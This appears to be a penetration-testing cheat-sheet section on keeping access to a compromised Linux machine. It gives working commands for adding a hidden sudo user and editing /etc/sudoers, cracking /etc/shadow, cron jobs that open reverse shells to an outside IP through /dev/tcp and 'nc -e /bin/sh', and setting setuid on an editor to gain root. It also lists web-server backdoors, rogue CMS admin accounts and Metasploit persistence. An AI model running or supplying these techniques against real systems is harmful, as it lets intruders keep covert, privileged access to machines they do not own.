## Persistence


* Create a New User

The most obvious, but not so subtle way is to just create a new user (if you are root, or someone with that privilege) .
```
adduser pelle
adduser pelle sudo
```
Now if the machine has ssh you will be able to ssh into the machine.

On some machines, older Linux I think, you have to do
```
useradd pelle
passwd pelle
echo "pelle    ALL=(ALL) ALL" >> /etc/sudoers
```

* Crack the password of existing user

Get the /etc/shadow file and crack the passwords. 
This is of course only persistent until the user decides to change his/her password. So not so good.

* Cronjob NC

Create cronjob that connects to your machine every 10 minutes. Here is an example using a bash-reverse-shell. You also need to set up a netcat listener.
Here is how you check if cronjob is active
```
service crond status
pgrep cron
```
If it is not started you can start it like this
```
service crond status
/etc/init.d/cron start

crontab -e
*/10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196

/10 * * * * nc -e /bin/sh 192.168.1.21 5556
```

Listener
```
nc -lvp 5556
```

Sometimes you have to set the user
```
crontab -e
*/10 * * * * pelle /path/to/binary
```

More info: http://kaoticcreations.blogspot.cl/2012/07/backdooring-unix-system-via-cron.html

* Metasploit persistence module

Create a binary with malicious content inside. Run that, get meterpreter shell, run metasploit persistence.
https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/
If you have a meterpreter shell you can easily just run persistence.

* Backdoor in Web Server

You can put a cmd or shell-backdoor in a webserver.
Put backdoor on webserver, either in separate file or in hidden in another file

* Admin Account to CMS

Add admin account to CMS.

* Mysql-backdoor

Mysql backdoor

* Hide Backdoor in bootblock

* Nmap 

If machine has nmap installed:
https://gist.github.com/dergachev/7916152

* Setuid on text-editor

You can setuid on an editor. So if you can easily enter as a www-data, you can easily escalate to root through the editor.
With vi it is extremely easy. You just run :shell, and it gives you a shell.

```
# Make root the owner of the file
chown root myBinary

# set the sticky bit/suid
chmod u+s myBinary
```



